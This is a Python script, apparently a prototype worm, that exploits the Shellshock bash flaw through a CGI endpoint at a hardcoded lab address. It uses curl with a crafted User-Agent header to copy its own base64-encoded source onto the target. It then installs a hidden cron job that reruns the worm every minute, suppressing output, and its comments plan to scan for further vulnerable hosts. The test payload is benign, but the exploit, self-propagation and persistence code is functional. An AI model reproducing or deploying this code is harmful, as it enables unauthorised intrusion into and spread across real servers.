#!/usr/bin/env python3

import os, sys, subprocess
import base64
from datetime import datetime

# Payload
payload_name = '/tmp/test_payload'
payload_content = "f = open('/tmp/test_payload_exec','w')"

# Worm tracking
def log():
	timestamp = datetime.now().strftime("%m-%d-%Y %H:%M:%S.%f")
	hostinfo = os.uname()

	f = open('/tmp/log','x')
	f.write(f'{timestamp}\n{hostinfo}\n')
	f.close()

# Creates a copy of the payload on host
def copy_payload():
	try:
		f = open(payload_name,'x') # 'x' opens for exclusive creation, failing if the file already exists
		f.write(payload_content)
		f.close()

	# TODO: clean this up
	except:
		# This can potentially check if a host has been infected, but the method isn't robust
		try:
			os.mkdir('/tmp/test_already_wormed')
		except:
			sys.exit(0)
		sys.exit(0)

# Executes payload on host
def execute_payload():
	exec(open(payload_name).read())
	log()

# Prototype for shellshock exploit
def exploit():
	cmd_list = []
	targets = {'192.168.56.111': '/cgi-bin/shock.sh'} # Hardcoding this for now

	# Base64 encode the worm source code for easy injection
	data = open(sys.argv[0], 'rb').read() # Change sys.argv[0]
	encoded = base64.b64encode(data).decode()
#	print(int(len(encoded)/2)
	encoded_a, encoded_b = encoded[:int(len(encoded)/2)], encoded[int(len(encoded)/2):]

	# Worm copying itself on vulnerable host
	cmd_list.append(f'echo {encoded_a} > /tmp/.testworm')
	cmd_list.append(f'echo {encoded_b} >> /tmp/.testworm')
	cmd_list.append('/usr/bin/base64 -d /tmp/.testworm > /tmp/testworm.py')
	cmd_list.append('/bin/chmod 777 /tmp/testworm.py')

	# Create bash script that adds cron job to execute worm every minute
	cmd_list.append('echo IyEvYmluL2Jhc2gKY3Jvbj0iKi8xICogKiAqICogL3Vzci9sb2NhbC9iaW4vcHl0aG9uMyAvdG1wL3Rlc3R3b3JtLnB5IgplY2hvICIkY3JvbiIgfCBjcm9udGFiIC0= > /tmp/.a')
	cmd_list.append('/usr/bin/base64 -d /tmp/.a > /tmp/add.sh')
	cmd_list.append('/bin/chmod 777 /tmp/add.sh')
	cmd_list.append('/tmp/add.sh')

	for IP in targets:
		vulnerable_path = targets[IP]
		url = f'http://{IP}{vulnerable_path}'

		for cmd in cmd_list:
			exploit = 'curl -s -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
			exploit += '\'' + cmd + '\'"'
			exploit += ' ' + url + ' > /dev/null' # Hide output
			subprocess.run(exploit, shell=True)

def main():
	# TODO:
	# - Also implement something so worm doesn't infect the computer that started it
	#
	# checkifrunning() # if worm already exists on host, then exit
	# gettargetIPs() # for now/simplicity/POC, just check if port 80 is open
	# shellshockvulnscan(targetIPs) # check common cgi paths for shellshock vuln
	#	returns target ip with its associated vulnerable path (if none, then exit program)
	# createpayloadarray()
	# exploit() # worm exploits shellshock vuln, copies itself over, then executes itself

	copy_payload() # Success if test_payload is created
	execute_payload() # Success if test_payload_exec is created. Also creates log.txt
	exploit() # spread

main()
